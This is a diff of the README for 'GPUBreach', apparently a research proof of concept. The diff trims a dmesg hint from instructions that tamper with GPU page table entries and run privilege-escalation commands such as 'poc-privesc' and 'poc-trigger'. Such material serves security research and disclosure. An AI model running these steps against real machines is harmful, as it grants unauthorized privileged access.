@@ -303,10 +303,8 @@ As instructed, on another terminal, you will execute:
 Once the terminal appears, it means the data has been loaded. Now go back to GPUBreach’s terminal and **Press Enter Key**. On success, GPUBreach will print the text below and exit:
 ```text
 Found its PTE, modified your pointer's PTE to point to: 0x060000000fff0005
-Press Enter Key if you want to write 0x060000000ffe0005 instead after looking at dmesg.
+Press Enter Key if you want to write 0x060000000ffe0005 instead.
 ```
-
-> If you open `sudo dmesg -w`, you can see a after `poc-init`, there are red text that is either `0xfff` or `0xffe`. Click enter if you see `0xffe`.
 
 Now you are ready to move on to Step 4.
 
@@ -317,7 +315,7 @@ Now you are ready to move on to Step 4.
 In the command prompt that opened in Step 2, run the following application commands step by step. Note that `>` means that these commands are run in the GPU memory operator's command prompt, not the regular shell.
 
 ```bash
-> poc-init # If case 2, check dmesg to see if base is `0xfff` or `0xffe`
+> poc-init
 > poc-cw-entry0-checksum
 > poc-privesc
 > poc-trigger 5
